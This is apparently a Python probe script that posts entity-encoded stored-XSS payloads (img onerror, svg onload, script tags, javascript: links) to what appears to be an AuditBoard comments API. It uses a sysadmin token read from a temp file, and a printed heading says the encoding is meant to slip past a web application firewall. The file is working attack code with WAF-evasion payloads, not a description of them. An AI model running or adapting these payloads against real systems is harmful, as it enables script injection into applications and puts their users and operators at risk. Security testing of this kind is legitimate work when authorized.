import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXE'+uuid.uuid4().hex[:5]
def post(msg_html,msg_raw=None):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,
                     "message_raw":msg_raw if msg_raw is not None else msg_html,
                     "message_html":msg_html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== entity-encoded payload in message_html (WAF sees no raw tag) ===")
probes=[
 ('img-entity',  f'&lt;img src=x onerror=alert(document.domain)&gt;{tag}'),
 ('img-num',     f'&#60;img src=x onerror=alert(document.domain)&#62;{tag}'),
 ('svg-entity',  f'&lt;svg onload=alert(document.domain)&gt;{tag}'),
 ('script-ent',  f'&lt;script&gt;alert(document.domain)&lt;/script&gt;{tag}'),
 ('a-js-entity', f'&lt;a href="javascript&colon;alert(1)"&gt;{tag}&lt;/a&gt;'),
]
for label,h in probes:
    c,b=post(h)
    stored=''
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            stored=f"id={o['id']} html={o.get('message_html')!r}"
        except: pass
    print(f"  {label:14} {c:>4}  {stored[:110]}")
